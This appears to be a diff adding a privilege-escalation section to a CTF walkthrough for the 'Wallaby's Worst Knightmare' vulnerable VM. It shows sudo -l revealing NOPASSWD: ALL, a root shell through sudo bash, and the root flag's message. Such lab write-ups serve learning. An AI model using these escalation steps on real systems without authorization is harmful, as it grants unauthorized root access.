@@ -395,8 +395,42 @@ id
 uid=1001(wallaby) gid=1001(wallaby) groups=1001(wallaby),4(adm)
 ```
 
+## 6.Privilege Escalation 3
+
+Check sudo permissions and get root :
+
+```text
+wallaby@ubuntu:~$ sudo -l
+sudo -l
+Matching Defaults entries for wallaby on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wallaby may run the following commands on ubuntu:
+    (ALL) NOPASSWD: ALL
 
 
+wallaby@ubuntu:~$ sudo bash
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cd /root
+
+cat flag.txt
+###CONGRATULATIONS###
+
+You beat part 1 of 2 in the "Wallaby's Worst Knightmare" series of vms!!!!
+
+This was my first vulnerable machine/CTF ever!  I hope you guys enjoyed playing it as much as I enjoyed making it!
+
+Come to IRC and contact me if you find any errors or interesting ways to root, I'd love to hear about it.
+
+Thanks guys!
+-Waldo
+```
+
+this is how you can get root on this box :)
 
 
 
